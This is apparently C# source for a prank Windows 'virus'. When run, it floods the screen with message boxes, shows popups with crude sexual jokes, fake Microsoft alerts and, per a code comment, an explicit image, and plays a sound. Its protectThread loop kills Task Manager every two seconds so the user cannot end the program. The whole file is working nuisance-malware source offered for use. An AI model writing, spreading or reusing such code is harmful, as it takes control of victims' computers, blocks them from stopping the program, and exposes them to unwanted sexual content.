using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Drawing;

using System.Windows;
using System.Windows.Forms;
using System.Timers;
using System.IO;
using System.Diagnostics;

namespace IMissedTheRageVirus
{
     //NOTE FOR DEBUGGING: To show the console Just go to the application's Properties and change the Output type from Windows Application to Console Application. this applies for building
     
    class Program
    {
        private static System.Timers.Timer msgTimer;
        private static System.Timers.Timer payloadT;

        private static Random r = new Random();

        private static string[] msgList =
        {
            "My penis itches",
            "U come here often?",
            "Device has detected that user requires special needs",
            "Microsoft want to alert you that bill gates does indeed not have a gate but an electric one.",
            "Studies say that 1 in 3 people are more likley to be the 1 in 3 person",
            "what the dog doin doe",
            "Candice wants to know what is happening! Wait who is candice you may ask? Can-dis dick fit in your mouth!",
            "Microhard would like to inform you that your futa collection has been stolen and is currently being sold as an NFT"
        };
        public static void Main(string[] args)
        {
            Application.EnableVisualStyles();

            //Init timer for the message popups
            msgTimer = new System.Timers.Timer();
            msgTimer.Interval = 1000;

            msgTimer.Elapsed += msgSpam; //Every interval msgSpam is called
            msgTimer.AutoReset = true;
            msgTimer.Enabled = true;

            //Init timer for main payload events
            payloadT = new System.Timers.Timer();
            payloadT.Interval = 5000;

            payloadT.Elapsed += mainPayload; //Every inerval mainPayload is called
            payloadT.AutoReset = true;
            payloadT.Enabled = true;

            //Play sound
            System.Media.SoundPlayer player = new System.Media.SoundPlayer(Properties.Resources.IMissedTheRage);
            player.Play();

            Thread protectT = new Thread(protectThread);
            protectT.Start();

            Console.WriteLine("Press the Enter key to exit anytime... ");
            Console.ReadLine();

            
        }

        private static void msgSpam(Object source, System.Timers.ElapsedEventArgs e)
        {
            msgBox messageBox = new msgBox();
            messageBox.ShowDialog();

        }

        private static void mainPayload(object source, System.Timers.ElapsedEventArgs e)
        {
            int i;
            i = r.Next(0, 2); //Asigns int random number, this is so a random event will occur when this function is called
            Console.WriteLine("i = " + i.ToString());
            switch (i)
            {
                case 0:
                    popup1 pop1 = new popup1();
                    pop1.ShowDialog(); //Shows up a sexy pic of hentick (shows the form called popup1)
                    break;
                case 1:
                    string choice = msgList[r.Next(msgList.Length)]; // Selects random string from list that i have carefully hand crafted
                    MessageBox.Show(choice, "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Error); //shows an alert
                    break;
            }
        }

        static void protectThread()
        {
            while (true)
            {
                Process[] tskmgr = Process.GetProcessesByName("taskmgr");
                if (tskmgr.Length > 0)
                {
                    Console.WriteLine("Task manager is open!");
                    foreach (Process process in tskmgr)
                    {
                        process.Kill();
                    }
                }
                Thread.Sleep(2000);
            }
        }

    }
}
